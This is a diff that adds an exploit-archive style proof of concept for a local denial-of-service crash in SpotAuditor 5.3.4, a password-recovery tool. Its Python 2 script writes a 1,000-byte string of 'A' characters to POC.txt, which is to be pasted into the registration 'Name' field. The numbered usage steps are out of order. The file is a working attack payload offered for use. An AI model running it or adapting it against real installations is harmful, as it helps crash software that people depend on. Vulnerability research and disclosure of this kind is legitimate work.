@@ -1,0 +1,36 @@
+# Exploit Title: SpotAuditor 5.3.4 - 'Name' Denial of Service (PoC)
+# Exploit Author: 0xMoHassan
+# Date: 2020-04-04
+# Vendor Homepage: https://www.spotauditor.com/
+# Software Link: http://www.nsauditor.com/downloads/spotauditor_setup.exe
+# Tested Version: 5.3.4
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows XP - SP3
+
+# About App
+
+# SpotAuditor is an advanced password recovery solution. The software recovers over 40 popular programs passwords, 
+# including passwords saved Google Chrome, Internet Explorer, Firefox and Opera browsers, Microsoft Office Outlook 
+# smtp and pop passwords, Hotmail password, Facebook password, Gmail password, Yahoo password, Aol password, 20 
+# top FTP program passwords, recovers saved passwords hidden behind of asterisks on dialogs and web forms.
+
+# PoC
+# 1.Run the python script, it will create a new file "POC.txt"
+# 3.Run SpotAuditor  and click on "Register -> Enter Registration Code"
+# 2.Paste the content of POC.txt into the Field: 'Name'
+# 6.click 'ok'
+# 5.Magic happen :)
+
+
+#!/usr/bin/env python
+buff = "\x41" *500
+buff += "\x41" * 500
+
+try:
+    f=open("POC.txt","w")
+    print "[+] Creating %s bytes payload.." %len(buff)
+    f.write(buff)
+    f.close()
+    print "[+] POC created!"
+except:
+    print "POC cannot be created"
